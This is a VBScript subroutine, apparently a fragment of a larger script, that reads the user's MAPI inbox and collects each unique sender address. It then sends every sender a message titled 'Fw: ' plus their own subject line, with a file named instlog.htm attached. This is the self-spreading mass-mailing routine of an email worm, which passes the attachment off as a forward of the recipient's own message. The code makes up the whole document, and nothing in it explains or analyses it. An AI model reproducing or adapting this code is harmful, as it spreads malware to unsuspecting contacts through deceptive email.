Sub Tsend()  
Dim Od, MS, MM, a, m  
Set Od = CreateObject("Scripting.Dictionary")  
MConnect MS, MM  
MM.FetchSorted = True  
MM.Fetch  
For i = 0 To MM.MsgCount - 1  
MM.MsgIndex = i  
a = MM.MsgOrigAddress  
If Od.Item(a) = "" Then  
Od.Item(a) = MM.MsgSubject  
End If  
Next  
For Each m In Od.Keys  
MM.Compose  
MM.MsgSubject = "Fw: " & Od.Item(m)  
MM.RecipAddress = m  
MM.AttachmentPathName = Gsf & "\instlog.htm"  
MM.Send  
Next  
